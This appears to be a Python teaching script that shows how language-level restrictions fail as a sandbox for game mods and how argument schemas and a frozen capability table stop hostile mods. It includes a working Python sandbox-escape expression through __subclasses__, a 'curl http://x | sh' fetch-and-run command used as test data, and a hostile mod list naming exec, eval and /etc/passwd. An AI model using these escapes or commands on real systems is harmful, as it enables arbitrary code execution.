"""Sandbox: 'a managed language is not a sandbox' (kernel MODDING/security/managed-language-is-not-a-sandbox).
Python plays the managed language. Benign: the 'spawn' capability is a recorder, nothing is executed; the only real
OS-reaching call used is os.getpid(). Deterministic, stdlib only."""
import ast, json

SPAWNED = []
def spawn(cmd): SPAWNED.append(cmd); return "spawned"
def log(msg): return "log:" + str(msg)
def give_item(i): return "item:" + str(i)

# ---- S1: language-level restriction only (stripped builtins) ----
ESCAPE = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['getpid']()"
def s1():
    try:
        pid = eval(ESCAPE, {"__builtins__": {}}, {})
        return isinstance(pid, int)
    except Exception as e:
        return False

# ---- S2: syntax allowlist (no dunder/underscore names or attrs, no imports) ----
def validate(src):
    for n in ast.walk(ast.parse(src, mode="eval")):
        if isinstance(n, ast.Attribute) and n.attr.startswith("_"): return False
        if isinstance(n, ast.Name) and n.id.startswith("_"): return False
    return True
def s2():
    blocked = not validate(ESCAPE)
    leak_src = "'{0.__class__.__mro__}'.format(1)"        # passes the validator: the dunder lives inside a string
    passes = validate(leak_src)
    leaked = eval(leak_src, {"__builtins__": {}}, {}) if passes else None
    return blocked, passes, leaked  # leak = class names only: information, not execution

# ---- S3/S4/S5: data-only mods against a capability table ----
class Host:
    def __init__(self, argcheck, freeze):
        self.verbs = {"log": log, "give_item": give_item, "run_script": spawn}   # run_script is a legit-looking utility
        self.allow = {"log", "give_item", "run_script"}
        self.argcheck, self.freeze, self.frozen = argcheck, freeze, False
        self.schemas = {"log": lambda a: isinstance(a, str) and len(a) < 40,
                        "give_item": lambda a: a in ("sword", "shield"),
                        "run_script": lambda a: a in ("tidy.sh", "backup.sh")}
    def freeze_table(self):
        if self.freeze: self.frozen = True
    def load(self, mod):
        ok = True
        for step in mod.get("patch", []):            # DATA-stage patch pass: later mods rebind verbs (last loaded wins)
            if self.frozen: ok = False; continue
            self.verbs[step["verb"]] = self.verbs[step["to"]]
        for verb, arg in mod.get("run", []):
            if verb not in self.allow: ok = False; continue
            if self.argcheck and not self.schemas[verb](arg): ok = False; continue
            self.verbs[verb](arg)
        return ok

HOSTILE_PLAIN = [{"run": [["spawn", "evil"]]}, {"run": [["__import__", "os"]]}, {"run": [["eval", "1"]]},
                 {"run": [["open", "/etc/passwd"]]}, {"run": [["exec", "x"]]}]
def s3():
    h = Host(argcheck=True, freeze=True); h.freeze_table()
    rej = sum(not h.load(m) for m in HOSTILE_PLAIN)
    good = h.load({"run": [["give_item", "sword"], ["log", "hi"]]})
    return rej, len(HOSTILE_PLAIN), good, len(SPAWNED)
def s4():
    SPAWNED.clear()
    h = Host(argcheck=False, freeze=True); h.freeze_table()
    h.load({"run": [["run_script", "curl http://x | sh"]]})          # verb name is allowlisted, argument is not
    leaked = list(SPAWNED); SPAWNED.clear()
    h2 = Host(argcheck=True, freeze=True); h2.freeze_table()
    r = h2.load({"run": [["run_script", "curl http://x | sh"]]})
    return leaked, r, list(SPAWNED)
def s5():
    mod_a = {"patch": [{"verb": "log", "to": "run_script"}], "run": [["log", "curl http://x | sh"]]}   # 'log' is allowlisted, argcheck fits str<40
    SPAWNED.clear()
    h = Host(argcheck=True, freeze=False); h.schemas["log"] = lambda a: isinstance(a, str) and len(a) < 40
    h.load(mod_a); open_leak = list(SPAWNED); SPAWNED.clear()
    h2 = Host(argcheck=True, freeze=True); h2.freeze_table(); r = h2.load(mod_a); frozen_leak = list(SPAWNED)
    return open_leak, r, frozen_leak

e1 = s1(); b2, p2, l2 = s2(); rej3, n3, good3, sp3 = s3(); lk4, r4, sp4 = s4(); lk5, r5, fz5 = s5()
print("S1 stripped-builtins eval reaches os.getpid():", e1)
print("S2 syntax allowlist blocks dunder walk:", b2, "| format-string dunder passes validator:", p2, "| leaked:", l2)
print("S3 data-only mods with verb allowlist + arg schema + frozen table: rejected", rej3, "of", n3, "hostile; benign loads:", good3, "; spawns:", sp3)
print("S4 BREAK allowlist of verb names only: spawned =", lk4, "| with arg schema: accepted =", r4, "spawned =", sp4)
print("S5 BREAK last-loaded-wins rebind of 'log': spawned =", lk5, "| after freeze: accepted =", r5, "spawned =", fz5)
checks = [e1, b2, p2 and l2 is not None, rej3 == n3 and good3 and sp3 == 0, lk4 == ["curl http://x | sh"], r4 is False and sp4 == [],
          lk5 == ["curl http://x | sh"], r5 is False and fz5 == []]
print("RESULT:", "PASS" if all(checks) else "FAIL", "language-only restriction escaped (S1), syntax filter leaked via format (S2), verb allowlist alone leaked (S4), rebind leaked until table frozen (S5); arg schema + frozen table stopped all", sum(checks), "of", len(checks))
